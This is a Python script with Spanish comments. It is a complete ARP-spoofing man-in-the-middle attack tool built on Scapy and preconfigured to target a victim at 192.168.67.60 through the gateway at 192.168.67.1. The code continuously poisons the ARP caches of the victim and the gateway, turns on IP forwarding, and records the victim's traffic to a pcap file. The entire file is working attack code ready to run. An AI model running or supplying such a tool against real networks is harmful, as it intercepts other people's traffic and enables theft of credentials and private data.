#!/usr/bin/env python3
"""
ATAQUE ARP MITM - Configurado para red 192.168.67.0/24
Atacante: 192.168.67.50
Víctima: 192.168.67.60
Gateway: 192.168.67.1
"""

import argparse
import os
import signal
import sys
import time
from threading import Thread, Event

try:
    from scapy.all import (
        ARP, Ether, srp, sendp, sniff, wrpcap,
        get_if_hwaddr, conf
    )
except ImportError:
    print("[!] Instalar Scapy: pip install scapy")
    sys.exit(1)

def get_mac(ip: str, iface: str) -> str | None:
    conf.verb = 0
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=3, iface=iface, retry=3
    )
    if ans:
        return ans[0][1].hwsrc
    return None

def enable_ip_forward() -> None:
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        f.write('1')
    print("[+] IP forwarding habilitado")

def disable_ip_forward() -> None:
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        f.write('0')
    print("[+] IP forwarding deshabilitado")

def poison_arp(target_ip: str, target_mac: str, spoof_ip: str, iface: str) -> None:
    pkt = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip,
        hwsrc=get_if_hwaddr(iface)
    )
    sendp(pkt, iface=iface, verbose=0)

def restore_arp(target_ip: str, target_mac: str, gateway_ip: str, gateway_mac: str, iface: str, count: int = 5) -> None:
    print("\n[*] Restaurando tablas ARP...")
    pkt_victim = Ether(dst=target_mac) / ARP(
        op=2, pdst=target_ip, hwdst=target_mac,
        psrc=gateway_ip, hwsrc=gateway_mac
    )
    pkt_gw = Ether(dst=gateway_mac) / ARP(
        op=2, pdst=gateway_ip, hwdst=gateway_mac,
        psrc=target_ip, hwsrc=target_mac
    )
    sendp([pkt_victim, pkt_gw], iface=iface, count=count, verbose=0)
    print("[+] Tablas ARP restauradas correctamente")

def attack_loop(victim_ip: str, victim_mac: str, gateway_ip: str, gateway_mac: str,
                iface: str, interval: float, stop_event: Event, counter: list) -> None:
    while not stop_event.is_set():
        poison_arp(victim_ip, victim_mac, gateway_ip, iface)
        poison_arp(gateway_ip, gateway_mac, victim_ip, iface)
        counter[0] += 2
        time.sleep(interval)

def capture_traffic(victim_ip: str, gateway_ip: str, iface: str, output_file: str, stop_event: Event) -> None:
    packets = []
    def packet_handler(pkt):
        packets.append(pkt)
        if len(packets) % 50 == 0:
            wrpcap(output_file, packets)
    sniff(
        iface=iface,
        filter=f"host {victim_ip} and host {gateway_ip}",
        prn=packet_handler,
        store=False,
        stop_filter=lambda _: stop_event.is_set()
    )
    if packets:
        wrpcap(output_file, packets)
        print(f"\n[+] Captura guardada: {output_file} ({len(packets)} paquetes)")

def stats_printer(counter: list, stop_event: Event) -> None:
    start = time.time()
    while not stop_event.is_set():
        elapsed = time.time() - start
        print(f"\r[*] ARPs enviados: {counter[0]:,} | Tiempo: {elapsed:.0f}s | Ctrl+C para detener", end='', flush=True)
        time.sleep(1)

def run_attack(iface: str, victim_ip: str, gateway_ip: str, interval: float, sniff_traffic: bool, output: str) -> None:
    print("[*] Resolviendo MACs...")
    victim_mac = get_mac(victim_ip, iface)
    if not victim_mac:
        print(f"[!] No se pudo resolver MAC de {victim_ip}")
        sys.exit(1)
    gateway_mac = get_mac(gateway_ip, iface)
    if not gateway_mac:
        print(f"[!] No se pudo resolver MAC del gateway {gateway_ip}")
        sys.exit(1)
    attacker_mac = get_if_hwaddr(iface)
    enable_ip_forward()

    print(f"""
╔══════════════════════════════════════════╗
║        ARP MitM Attack — Activo          ║
╠══════════════════════════════════════════╣
║  Atacante IP : 192.168.67.50             ║
║  Atacante MAC: {attacker_mac:<24} ║
║  Víctima IP  : {victim_ip:<24} ║
║  Víctima MAC : {victim_mac:<24} ║
║  Gateway IP  : {gateway_ip:<24} ║
║  Gateway MAC : {gateway_mac:<24} ║
╚══════════════════════════════════════════╝
[!] Presiona Ctrl+C para detener
""")

    counter = [0]
    stop_event = Event()

    def cleanup(sig, frame):
        stop_event.set()
        time.sleep(1)
        restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac, iface)
        disable_ip_forward()
        sys.exit(0)

    signal.signal(signal.SIGINT, cleanup)

    threads = [
        Thread(target=attack_loop, args=(victim_ip, victim_mac, gateway_ip, gateway_mac, iface, interval, stop_event, counter), daemon=True),
        Thread(target=stats_printer, args=(counter, stop_event), daemon=True)
    ]
    if sniff_traffic and output:
        threads.append(Thread(target=capture_traffic, args=(victim_ip, gateway_ip, iface, output, stop_event), daemon=True))
        print(f"[+] Capturando tráfico → {output}")

    for t in threads:
        t.start()
    for t in threads:
        t.join()

if __name__ == '__main__':
    if os.geteuid() != 0:
        print("[!] Ejecutar como root: sudo python3 arp_mitm.py")
        sys.exit(1)
    
    # CONFIGURACIÓN PREDETERMINADA PARA TU RED
    VICTIM_IP = "192.168.67.60"
    GATEWAY_IP = "192.168.67.1"
    IFACE = "eth0"
    
    run_attack(iface=IFACE, victim_ip=VICTIM_IP, gateway_ip=GATEWAY_IP,
               interval=2.0, sniff_traffic=True, output="captura_mitm.pcap")
